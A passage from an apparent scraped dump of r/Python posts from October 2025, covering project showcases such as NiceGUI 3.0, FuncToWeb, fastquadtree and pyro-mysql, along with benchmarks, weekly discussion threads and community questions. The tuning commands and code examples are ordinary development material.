* Increased Max File Descriptors: Every socket is a file. The default limit of 1024 is the first thing you'll hit.ulimit -n 65536
* Expanded Ephemeral Port Range: The client needs a large pool of ports to make outgoing connections from.net.ipv4.ip\_local\_port\_range = 1024 65535
* Increased Connection Backlog: The server needs a bigger queue to hold incoming connections before they are accepted. The default is tiny.net.core.somaxconn = 65535
* Enabled TIME\_WAIT Reuse: This is huge. It allows the kernel to quickly reuse sockets that are in a TIME\_WAIT state, which is essential when you're opening/closing thousands of connections per second.net.ipv4.tcp\_tw\_reuse = 1

I've open-sourced the entire test setup, including the client code, a simple server, and the full tuning scripts for both machines. You can find it all here if you want to replicate it or just look at the code:

**GitHub Repo:** [**https://github.com/lafftar/requestSpeedTest**](https://github.com/lafftar/requestSpeedTest)

On an 8-core machine, this setup hit \~15k req/s, and it scaled to \~20k req/s on a 32-core machine. Interestingly, the CPU was never fully maxed out, so the bottleneck likely lies somewhere else in the stack.

I'll be hanging out in the comments to answer any questions. Let me know what you think!

**Blog Post (I go in a little more detail)**: [https://tjaycodes.com/pushing-python-to-20000-requests-second/](https://tjaycodes.com/pushing-python-to-20000-requests-second/)"
1o04g6v,I benchmarked 5 different FastAPI file upload methods (1KB to 1GB),fedirz,104,12,2025-10-07 03:49:51,https://www.reddit.com/r/Python/comments/1o04g6v/i_benchmarked_5_different_fastapi_file_upload/,"### What my project does

I've created a [benchmark](https://github.com/fedirz/fastapi-file-upload-benchmark) to test 5 different ways to handle file uploads in FastAPI across 21 file sizes from 1KB to 1GB:
- `File()` - sync and async variants
- `UploadFile` - sync and async variants
- `request.stream()` - async streaming

Key findings for large files (128MB+):
- `request.stream()` hits ~1500 MB/s throughput vs ~750 MB/s for the others
- Additional memory used: `File()` consumes memory equal to the file size (1GB file = 1GB RAM), while `request.stream()` and `UploadFile` don't use extra memory
- For a 1GB upload: streaming takes 0.6s, others take 1.2-1.4s

Full benchmark code, plots, results, and methodology: https://github.com/fedirz/fastapi-file-upload-benchmark
Test hardware: MacBook Pro M3 Pro (12 cores, 18GB RAM)

### Target Audience
Those who write Web API in Python

### Comparison
N/A

Happy to answer questions about the setup or findings.
"
1nzznk3,Tuesday Daily Thread: Advanced questions,AutoModerator,2,0,2025-10-07 00:00:41,https://www.reddit.com/r/Python/comments/1nzznk3/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1nzr2bv,"Crank.py - Build web UIs with async/generator functions, powered by Crank.js/PyScript.",bikeshaving,9,7,2025-10-06 18:26:23,https://www.reddit.com/r/Python/comments/1nzr2bv/crankpy_build_web_uis_with_asyncgenerator/,"I just released the first public version of [Crank.py](http://github.com/bikeshaving/crankpy), Crank bindings for Crank.js.

## Links:

* GitHub repo: [https://github.com/bikeshaving/crankpy](https://github.com/bikeshaving/crankpy)
* Blog post: [http://crank.js.org/blog/introducing-crank-py ](http://crank.js.org/blog/introducing-crank-py)
* TodoMVC example: [https://pyscript.com/@brainkim/crank-todomvc/latest](https://pyscript.com/@brainkim/crank-todomvc/latest)
* PyPI: [https://pypi.org/project/crankpy/](https://pypi.org/project/crankpy/)

## What My Project Does

Crank.py provides PyScript bindings to Crank.js, allowing users to write frontend UI components with Python generator and async functions. Here‚Äôs a quick example:

```python
from js import document
from pyodide.http import pyfetch
from crank import component, h
from crank.dom import renderer
import asyncio

@component
async def Definition(ctx, props):
    word = props['word']
    # API courtesy https://dictionaryapi.dev
    res = await pyfetch(f""https://api.dictionaryapi.dev/api/v2/entries/en/{word}"")
    data = await res.json()

    # Check if API returned an error (not an array)
    if not isinstance(data, list):
        return h.div[f""No definition found for {word}""]

    # Extract data exactly like the JavaScript version
    # const {phonetic, meanings} = data[0];
    # const {partOfSpeech, definitions} = meanings[0];
    # const {definition} = definitions[0];
    phonetic = data[0].get('phonetic', '')
    meanings = data[0]['meanings']
    part_of_speech = meanings[0]['partOfSpeech']
    definitions = meanings[0]['definitions']
    definition = definitions[0]['definition']

    return h.div[
        h.p[word, "" "", h.code[phonetic]],
        h.p[h.b[f""{part_of_speech}.""], "" "", definition]
    ]

@component
def Dictionary(ctx):
    word = """"

    @ctx.refresh
    def onsubmit(ev):
        nonlocal word
        ev.preventDefault()
        # Get the input value directly from the DOM
        input_el = document.getElementById(""word"")
        word1 = input_el.value
        if word1 and word1.strip():
            word = word1.strip()

    for _ in ctx:
        yield h.div[
            h.form(
                action="""",
                method=""get"",
                onsubmit=onsubmit,
                style={""margin-bottom"": ""15px""}
            )[
                h.div(style={""margin-bottom"": ""15px""})[
                    h.label(htmlFor=""word"")[""Define: ""],
                    h.input(type=""text"", name=""word"", id=""word"", required=True)
                ],
                h.div[
                    h.input(type=""submit"", value=""Search"")
                ]
            ],
            h(Definition, word=word) if word else None
        ]

renderer.render(h(Dictionary), document.body)
```
## Target Audience

Crank.py is for Python developers who want to write web UIs with Python instead of JavaScript. It‚Äôs perfect for rich client-side Python apps, teaching web development with Python, and building interactive Python data apps which leverage the entire Python ecosystem.

## Comparison

Compared to [Pue.py](https://puepy.dev), Crank.py uses Python functions exclusively for component definitions, and provides an innovative template syntax as a replacement for JSX/templates."
1nzl1nj,Why is Python type hinting so maddening compared to other implementations?,ataltosutcaja,288,150,2025-10-06 14:45:17,https://www.reddit.com/r/Python/comments/1nzl1nj/why_is_python_type_hinting_so_maddening_compared/,"I work professionally with a bunch of languages, as an integration engineer. Python is a fairly common one and sometimes I need to add just the right API I need for my integration work to a project. I don't compromise on anything that helps me catch bugs before runtime, so I always have the strictest type checking enabled, which however... when it comes to Python, drives me insane. Once one starts building complex applications, `# type: ignore` becomes your best friend, because handling e.g. a GeoPandas type error would require one hour, even though runtime-wise it has no repercussions whatsoever.

I have worked with other type hinting systems, namely Erlang's, Elixir's and PHP's and I must say, none of them has given me the headaches that Python's regularly gives me. So, I was wondering if there is something inherent to Python that makes type hints a nightmare? Is the tooling ""bad""? What is the issue exactly?"
1nzkswp,fastquadtree: a Rust-powered quadtree for Python that is ~14x faster than PyQtree,Awkward-Target4899,67,14,2025-10-06 14:36:13,https://www.reddit.com/r/Python/comments/1nzkswp/fastquadtree_a_rustpowered_quadtree_for_python/,"Quadtrees are great for organizing spatial data and checking for 2D collisions, but all the existing Python quadtree packages are slow and outdated.

My package, fastquadtree, leverages a Rust core to outperform the most popular Python package, pyqtree, by being **14x faster**. It also offers a more convenient Python API for tracking objects and KNN queries.

**PyPI page:** [https://pypi.org/project/fastquadtree/](https://pypi.org/project/fastquadtree/)  
**GitHub Repo:** [https://github.com/Elan456/fastquadtree](https://github.com/Elan456/fastquadtree)  
**Wheels Shipped**: Linux, Mac, and Windows

    pip install fastquadtree

The GitHub Repo contains utilities for visualizing how the quadtree works using Pygame and running the benchmarks yourself.

Benchmark Comparison

* Points: **250,000**, Queries: **500**
* Fastest total: **fastquadtree** at **0.120 s**

|Library|Build (s)|Query (s)|Total (s)|Speed vs PyQtree|
|:-|:-|:-|:-|:-|
|fastquadtree|0.031|0.089|0.120|14.64√ó|
|Shapely STRtree|0.179|0.100|0.279|6.29√ó|
|nontree-QuadTree|0.595|0.605|1.200|1.46√ó|
|Rtree|0.961|0.300|1.261|1.39√ó|
|e-pyquadtree|1.005|0.660|1.665|1.05√ó|
|PyQtree|1.492|0.263|1.755|1.00√ó|
|quads|1.407|0.484|1.890|0.93√ó|"
1nzkeo0,FineTuned IBM Granite-4 with Python and UnslothüöÄ,krishanndev,0,0,2025-10-06 14:21:08,https://www.reddit.com/r/Python/comments/1nzkeo0/finetuned_ibm_granite4_with_python_and_unsloth/,"Hey all, thanks for reading this!

I have finetuned the latest IBM's Granite-4.0 model using Python and the Unsloth library, since the model is quite small, I felt that it might not be able to give good results, but the results were far from what I expected.

This small model was able to generate output with **low latency** and with **great accuracy**. I even tried to lower the temperature to allow it to be more creative, but still the model managed to produce quality and to the point output.

I have pushed the LoRA model on Hugging Face and have also written an article dealing with all the nuances and intricacies of¬†**finetuning**¬†the¬†**latest IBM's Granite-4.0**¬†model.

Currently working on adding the model card to the model.

Please share your thoughts and feedback!  
Thank you!

Here's the [model](https://huggingface.co/krishanwalia30/granite-4.0-h-micro_lora_model).

Here's the [article](https://medium.com/towards-artificial-intelligence/ibms-granite-4-0-fine-tuning-made-simple-create-custom-ai-models-with-python-and-unsloth-4fc11b529c1f)."
1nzib8m,uv overtakes pip in CI (for Wagtail & FastAPI),thibaudcolas,135,31,2025-10-06 12:56:55,https://www.reddit.com/r/Python/comments/1nzib8m/uv_overtakes_pip_in_ci_for_wagtail_fastapi/,"**for Wagtail: 66% of CI downloads with uv; for Django: 43%; for FastAPI: 60%**. For all downloads CI or no, it‚Äôs at 28% for Wagtail users; 21% for Django users; 31% for FastAPI users. If the current adoption trends continue, it‚Äôll be the most used installer on those projects in about 12-14 months.

Article: [uv overtakes pip in CI (for Wagtail users)](https://wagtail.org/blog/uv-overtakes-pip-in-ci/)."
1nzhs1s,NiceGUI 3.0: Write web interfaces in Python. The nice way.,r-trappe,253,46,2025-10-06 12:33:36,https://www.reddit.com/r/Python/comments/1nzhs1s/nicegui_30_write_web_interfaces_in_python_the/,"We're happy to announce the **third major release of NiceGUI**.

[NiceGUI](https://nicegui.io) is a powerful yet simple-to-use UI framework to build applications, dashboards, and tools that run in the browser. You write Python; NiceGUI builds the frontend and handles the browser plumbing. It's great for modern web apps, internal tools, data science apps, robotics interfaces, and embedded/edge UIs ‚Äî anywhere you want a polished web interface without frontend framework complexity.

We recently discussed NiceGUI on the Talk Python To Me podcast ‚Äî [watch on YouTube](https://www.youtube.com/watch?v=74UXonJfl6o).

# Highlights

* **Single-Page Apps** with `ui.run(root=...)` \+ [`ui.sub_pages`](https://nicegui.io/documentation/sub_pages/)
* New **script mode** for small and tight Python scripts (see below).
* Lightweight [**Event system**](https://nicegui.io/documentation/event) to connect short‚Äëlived UIs with long‚Äëlived Python services.
* **Observables**: modify props/classes/style and the UI updates automatically.
* **Tables / AG Grid**: update live via `table.rows/columns` or `aggrid.options`.
* **Simplified pytest** [setup](https://nicegui.io/documentation/section_testing) and improved [`user` fixture](https://nicegui.io/documentation/user) for fast UI tests.
* **Tailwind 4** support.

Full notes & migration: [3.0.0 release](https://github.com/zauberzeug/nicegui/releases/tag/v3.0.0)

# Minimal examples

**Script mode**

    from nicegui import ui
    
    ui.label('Hello, !')
    ui.button('Click me', on_click=lambda: ui.notify('NiceGUI 3.0'))
    
    ui.run()

Run the file; your browser will show the app at `http://localhost:8080`.

**Single‚ÄëPage App (SPA)**

    from nicegui import ui
    
    ui.link.default_classes('no-underline')
    
    def root():
        with ui.header().classes('bg-gray-100'):
            ui.link('Home', '/')
            ui.link('About', '/about')
        ui.sub_pages({
            '/': main,
            '/about': about,
        })
    
    def main():
        ui.label('Main page')
    
    def about():
        ui.label('About page')
    
    ui.run(root)

When started, every visit to [`http://localhost:8080`](http://localhost:8080) executes `root` and shows a header with links to the `main` and `about` pages.

# Why it matters

* **Build UI in the backend**: one codebase/language with direct access to domain state and services. Fewer moving parts and tighter security boundaries.
* **Async by default**: efficient I/O, WebSockets, and streaming keep UIs responsive under load.
* **FastAPI under the hood**: REST + UI in one codebase, fully typed, and proven middleware/auth.
* **Tailwind utilities + Quasar components**: consistent, responsive styling, and polished widgets without frontend setup.
* **General‚Äëpurpose apps**: explicit routing, Pythonic APIs, and intuitive server‚Äëside state handling.

# Get started

* Install: `pip install nicegui`
* Documentation & Quickstart: [nicegui.io](https://nicegui.io) (built with NiceGUI itself)
* 3.0 release notes & migration: [3.0.0 release](https://github.com/zauberzeug/nicegui/releases/tag/v3.0.0)
* License: MIT. Python 3.9+.

If you build something neat, share a screenshot or repo. We‚Äôd love to see it!"
1nz9vl6,Edazer ‚Äî Fast EDA Toolkit (pandas + polars compatible,Adarsh3690704,39,2,2025-10-06 04:42:53,https://www.reddit.com/r/Python/comments/1nz9vl6/edazer_fast_eda_toolkit_pandas_polars_compatible/,"Hey everyone üëã
I built a small Python library called Edazer to make quick Exploratory Data Analysis (EDA) less painful and more fun.
It‚Äôs designed to give you a full dataset summary in just a few lines ‚Äî no need to keep rewriting the same EDA boilerplate every project.

üîç What It Does

Edazer can:

Summarize missing values, descriptive stats & data types

Find duplicated rows

Show unique values by column

Integrate YData Profiling for full reports

Even make your DataFrame interactive with one function


All that ‚Äî literally in 4 lines of code üòÖ

üéØ Who It‚Äôs For

If you‚Äôre a data scientist, analyst, or ML student who starts every project with the same 10 lines of EDA setup‚Ä¶ this is for you.
It‚Äôs super handy for quick dataset exploration, Kaggle projects, or teaching demos.


‚öñÔ∏è How It‚Äôs Different

Compared to tools like pandas-profiling or Sweetviz:

Lightweight ‚Äî only the essentials

Works with both pandas and polars

Runs faster and uses less memory on medium datasets

Super simple API, ideal for notebooks and quick checks


üíª GitHub: https://github.com/adarsh-79/edazer
üìä Kaggle: https://www.kaggle.com/code/adarsh79x/edazer-for-quick-eda-pandas-polars-profiling

"
1nz6lku,Sometimes regressing your Python version is the way. Use pyenv to manage multiple versions of Python,vishalontheline,0,12,2025-10-06 01:56:04,https://www.reddit.com/r/Python/comments/1nz6lku/sometimes_regressing_your_python_version_is_the/,"TL;DR: get pyenv to manage multiple versions of python on your system.

This is a beginner tech tip.

Turns out the newest version of Python / pip on my Mac doesn't let me install PyTorch - some version related error.

Luckily, it is very easy to manage multiple versions of python on a single system using pyenv (https://github.com/pyenv/pyenv).

I was able to install an older version, which let me install Pytorch."
1nz4695,Monday Daily Thread: Project ideas!,AutoModerator,35,0,2025-10-06 00:00:32,https://www.reddit.com/r/Python/comments/1nz4695/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1nz2qwk,Turns Python functions into web UIs,drboom9,146,40,2025-10-05 22:56:01,https://www.reddit.com/r/Python/comments/1nz2qwk/turns_python_functions_into_web_uis/,"A year ago I posted [FuncToGUI](https://github.com/offerrall/FuncToGUI) here (220 upvotes, thanks!) - a tool that turned Python functions into desktop GUIs. Based on feedback, I rebuilt it from scratch as **FuncToWeb** for web interfaces instead.

# What My Project Does

FuncToWeb automatically generates web interfaces from Python functions using type hints. Write a function, call `run()`, and get an instant form with validation.

    from func_to_web import run
    
    def divide(a: int, b: int):
        return a / b
    
    run(divide)

Open `localhost:8000` \- you have a working web form.

It supports all Python types (`int`, `float`, `str`, `bool`, `date`, `time`), special inputs (color picker, email validation), file uploads with type checking (`ImageFile`, `DataFile`), Pydantic validation constraints, and dropdown selections via `Literal`.

**Key feature:** Returns PIL images and matplotlib plots automatically - no need to save/load files.

    from func_to_web import run, ImageFile
    from PIL import Image, ImageFilter
    
    def blur_image(image: ImageFile, radius: int = 5):
        img = Image.open(image)
        return img.filter(ImageFilter.GaussianBlur(radius))
    
    run(blur_image)

Upload image and see processed result in browser.

# Target Audience

This is for **internal tools and rapid prototyping**, not production apps. Specifically:

* Teams needing quick utilities (image resizers, data converters, batch processors)
* Data scientists prototyping experiments before building proper UIs
* DevOps creating one-off automation tools
* Anyone who needs a UI ""right now"" for a Python function

**Not suitable for:**

* Production web applications (no authentication, basic security)
* Public-facing tools
* Complex multi-page applications

Think of it as duct tape for internal tooling - fast, functional, disposable.

# Comparison

**vs Gradio/Streamlit:**

* **Scope:** They're frameworks for building complete apps. FuncToWeb wraps individual functions.
* **Use case:** Gradio/Streamlit for dashboards and demos. FuncToWeb for one-off utilities.
* **Complexity:** They have thousands of lines. This is 350 lines of Python + 700 lines HTML/CSS/JS.
* **Philosophy:** They're opinionated frameworks. This is a minimal library.

**vs FastAPI Forms:**

* FastAPI requires writing HTML templates and routes manually
* FuncToWeb generates everything from type hints automatically
* FastAPI is for building APIs. This is for quick UIs.

**vs FuncToGUI (my previous project):**

* Web-based instead of desktop (Kivy)
* Works remotely, easier to share
* Better image/plot support
* Cleaner API using `Annotated`

# Technical Details

**Built with:** FastAPI, Pydantic, Jinja2

**Features:**

* Real-time validation (client + server)
* File uploads with type checking
* Smart output detection (text/JSON/images/plots)
* Mobile-responsive UI
* **Multi-function support**¬†\- Serve multiple tools from one server

The repo has 14 runnable examples covering basic forms, image processing, and data visualization.

# Installation

    pip install func-to-web

**GitHub:** [https://github.com/offerrall/FuncToWeb](https://github.com/offerrall/FuncToWeb)

Feedback is welcome!"
1nyrenf,For VScode users: What's your opinion on Github Copilot's autocompletion feature?,MaleficentBed1249,0,12,2025-10-05 15:36:23,https://www.reddit.com/r/Python/comments/1nyrenf/for_vscode_users_whats_your_opinion_on_github/,"I use GitHub Copilot pretty much daily in my coding projects. My usual process is to start typing a line and see what Copilot suggests, then decide if it's what I'm looking for or not. If it makes sense, I'll accept it; if not, I'll either modify it or write it myself.



Honestly, it's made my coding way faster and more efficient. But I've got friends who think this isn't ""real coding"" and that I'm just letting the AI do all the work. Some call it ""vibe coding,"" which I guess is a thing now?



I don't really agree though. You still need to understand the code and syntax to know whether Copilot's suggestion is actually good or complete garbage. It's more like having a really smart coding buddy who sometimes gives great suggestions and sometimes suggests weird stuff you have to ignore.



What's everyone's take on this? Are you team Copilot or do you think it's not worthy of being called coding?"
1ny9jqm,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,1,6,2025-10-05 00:00:33,https://www.reddit.com/r/Python/comments/1ny9jqm/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1ny6svl,I made PyPIPlus.com ‚Äî a faster way to see all dependencies of any Python package,RoyalW1zard,164,104,2025-10-04 21:58:32,https://www.reddit.com/r/Python/comments/1ny6svl/i_made_pypipluscom_a_faster_way_to_see_all/,"Hey folks 

I built a small tool called PyPIPlus.com that helps you quickly see all dependencies for any Python package on PyPI.

It started because I got tired of manually checking dependencies when installing packages on servers with limited or no internet access. We all know that pain trying to figure out what else you need to download by digging through package metadata or pip responses. 

With PyPIPlus, you just type the package name and instantly get a clean list of all its dependencies (and their dependencies). No installation, no login, no ads ‚Äî just fast info.

Why it‚Äôs useful: 
‚Ä¢ Makes offline installs a lot easier (especially for isolated servers) 
‚Ä¢ Saves time 
‚Ä¢ Great for auditing or just understanding what a package actually pulls in

Would love to hear your thoughts ‚Äî bugs, ideas, or anything you think would make it better. It‚Äôs still early and I‚Äôm open to improving it. 

https://pypiplus.com

UPDATE: thank you everyone for the positive comments and feedback, please feel free share any additional ideas we can make this a better tool. I‚Äôll be making sure of taking each comment and feature requests mentioned and try to make it available in the next push update üôè"
1ny2zk8,Is zfill() useless in Python?,Timely-Cat-6587,0,14,2025-10-04 19:23:55,https://www.reddit.com/r/Python/comments/1ny2zk8/is_zfill_useless_in_python/,"I‚Äôm trying to learn all of Python‚Äôs built-in functions before starting OOP, so I‚Äôm curious how this function could be used in real projects."
1nxy1nj,AnvPy ‚Äî Run & Build Python Apps Natively on Android,Ajay7750,20,16,2025-10-04 16:10:17,https://www.reddit.com/r/Python/comments/1nxy1nj/anvpy_run_build_python_apps_natively_on_android/,"Check out our intro video: https://youtu.be/A04UM53TRZw?si=-90Mkja0ojRS8x5p

AnvPy is a next-generation framework designed for Python developers to build, deploy, and run Python applications directly on Android devices offline. With AnvPy, you can:

Write your project in pure Python

Instantly generate a native Android APK

Enjoy seamless execution on mobile without external dependencies

Leverage familiar Python libraries and toolchains


Whether you're prototyping mobile apps, teaching Python, or shipping real-world tools ‚Äî AnvPy makes mobile development accessible and fast. Dive into the video to see a live demo and get started today!"
1nxtuvm,Do you let linters modify code in your CI/CD pipeline?,mbsp5,63,130,2025-10-04 13:21:44,https://www.reddit.com/r/Python/comments/1nxtuvm/do_you_let_linters_modify_code_in_your_cicd/,"For example, with black you can have it check but not modify. Do you think it‚Äôs safe enough to let it modify? I‚Äôve never heard of a horror story‚Ä¶ but maybe that‚Äôs because people don‚Äôt do it?"
1nxtj9r,I created a framework for turning PyTorch training scripts into event driven systems.,EricHermosis,1,0,2025-10-04 13:07:46,https://www.reddit.com/r/Python/comments/1nxtj9r/i_created_a_framework_for_turning_pytorch/,"**What My Project Does**

Hi! I've been training a lot of neural networks recently and want to share with you a tool I created.

While training pytorch models, I noticed that it is very hard to write reusable code for training models. There are packages that help track metrics, logs, and checkpoints, but they often create more problems than they solve. As a result, training pipelines become bloated with infrastructure code that obscures the actual business logic.

That‚Äôs why I created TorchSystem a package designed to help you build extensible training systems using domain-driven design principles, to replace ugly training scripts with clean, modular, and fully featured training services, with type annotations and modern python syntax.

**Repository**:[ https://github.com/entropy-flux/TorchSystem](https://github.com/entropy-flux/TorchSystem)

**Documentation**:[ https://entropy-flux.github.io/TorchSystem/](https://entropy-flux.github.io/TorchSystem/)

**Full working example**:[ https://github.com/entropy-flux/TorchSystem/tree/main/examples/mnist-mlp](https://github.com/entropy-flux/TorchSystem/tree/main/examples/mnist-mlp)

**Target Audience**

* ML engineers building **complex training pipelines** who need modularity.
* Researchers experimenting with **custom training loops** without reinventing boilerplate.
* Developers who want **DDD-inspired architecture** in their AI projects.
* Anyone frustrated with hard-to-maintain ""script soup"" training code.

**Comparison**

* [pytorch-lightning](https://github.com/Lightning-AI/pytorch-lightning): There aren't any framework doing this,[ pytorch-lightning](https://github.com/Lightning-AI/pytorch-lightning) come close by encapsulating all kind of infrastructure and the training loop inside a custom class, but it doesn't provide a way to actually decouple the logic from the implementation details. You can use a LightningModule¬† instead of my Aggregate class, and use the whole the message system of the library to bind it with other tools you want.
* [mlflow](https://github.com/mlflow/mlflow): Helps with model tracking and checkpoints, but again, you will end up with a lot of infrastructure logic inside your training loop, you can actually plug tracking libraries like this inside Consumer or a Subscriber and pass metrics as events or to topics as serializable messages.
* [neptune.ai](https://neptune.ai/): Web infra for metric tracking, like[ mlflow](https://github.com/mlflow/mlflow) you can plug it like a consumer or a subscriber, the good thing is that thanks to dependency inversion you can plug many of these tracking libraries at the same time to the same publisher and send the metrics to all of them.

Hope you find it useful!"
1nxt42j,pyro-mysql: a fast MySQL client library,Sad_Tap_9191,1,3,2025-10-04 12:49:07,https://www.reddit.com/r/Python/comments/1nxt42j/pyromysql_a_fast_mysql_client_library/,"* **Repo**
   * [https://github.com/elbaro/pyro-mysql/](https://github.com/elbaro/pyro-mysql/)
* **Bench**
   * [https://github.com/elbaro/pyro-mysql/blob/main/report/chart.png?raw=true](https://github.com/elbaro/pyro-mysql/blob/main/report/chart.png?raw=true)
* **What My Project Does**
   * **pyro-mysql** is a fast MySQL client library.
* **Target Audience** (e.g., Is it meant for production, just a toy project, etc)
   * **pyro-mysql** benefits the reliability and speed of Rust.
   * **pyro-mysql** delegates the protocol implementation to the existing Rust libraries, and the Python layer focuses on managing the lifetime of wrapped objects. This reduces the maintenance work of the Python package.
   * It is meant for production, but needs more battle-tests.
* **Comparison** (A brief comparison explaining how it differs from existing alternatives.)
   * `pyro-mysql` does not implement PEP 249.
      * There is no cursor.
   * `mysqlclient`, `pymysql` \- they are synchronous.
      * `pyro_mysql.sync` is faster.
   * `aiomysql`, `asyncmy` \- they are asynchoronous.
      * In my last workplace, our prod experience with them was not good.
      * `FastAPI + aiomysql/asyncmy` setup had protocol errors (Packet Sequence Number wrong) in highly congested environment. We also often ran into critical bugs mixing the query result - the result of query1 was returned to query2."
1nxf9sn,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,7,1,2025-10-04 00:00:33,https://www.reddit.com/r/Python/comments/1nxf9sn/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1nx8bzo,My journey from PyCon Accra 2024 to preparing for PyCon Africa 2025 in South Africa,Kof7029,0,0,2025-10-03 19:14:15,https://www.reddit.com/r/Python/comments/1nx8bzo/my_journey_from_pycon_accra_2024_to_preparing_for/,"I‚Äôm [DJAKPA Koffi](https://www.linkedin.com/in/djakpa-koffi), a tech enthusiast from Togo.

In October 2024, I had the incredible opportunity to attend **PyCon Africa in Accra, Ghana**. I learned a lot, met inspiring developers from across Africa, and returned home motivated to share my knowledge.

At my return, with friends, we organized an **Extender in Lom√©**, which brought together nearly 200 registrants and over 150 attendees. It was amazing to see the engagement and interest from participants, confirming that our efforts were having a real impact.

Now, I am preparing to attend **PyCon Africa 2025 in South Africa** to continue learning and bring back even more knowledge to share with young learners.  
A few days before the event, reality catches up with me, and to change that reality, I need your support ( [https://gofund.me/2df7717be](https://gofund.me/2df7717be) ), whatever form it may take. Thank you for your time and attention."
1nx3hkg,[Show & Tell] PyClue/Cluedo-style deduction game in Python (pygame),rozsit,32,0,2025-10-03 16:13:36,https://www.reddit.com/r/Python/comments/1nx3hkg/show_tell_pycluecluedostyle_deduction_game_in/,"**What My Project Does**  
I built a small Clue/Cluedo-style deduction game in **Python** using **pygame**. It‚Äôs a scene-based desktop game with clean, portable asset handling. You can run it from source or as a single **Windows .exe** (PyInstaller one-file). The repo is meant to be a practical reference for packaging pygame apps reliably.

**Source code (GitHub):**  
[https://github.com/rozsit/112\_PyClue\_Game](https://github.com/rozsit/112_PyClue_Game)

*(Windows build is in the GitHub Release ‚Äî see ‚ÄúDownloads‚Äù below.)*

**Target Audience**

* Python devs interested in **pygame** architecture and **packaging to .exe**.
* Learners who want a small, readable codebase (scenes, UI, audio, animations).
* Casual players who just want to double-click an `.exe` and try a Clue-like game.

**Comparison**  
Compared with other ‚Äúpygame Clue clones‚Äù or small hobby games, this repo focuses on **robust distribution** and **developer ergonomics**:

* Works the same in **dev** and **frozen** modes (PyInstaller).
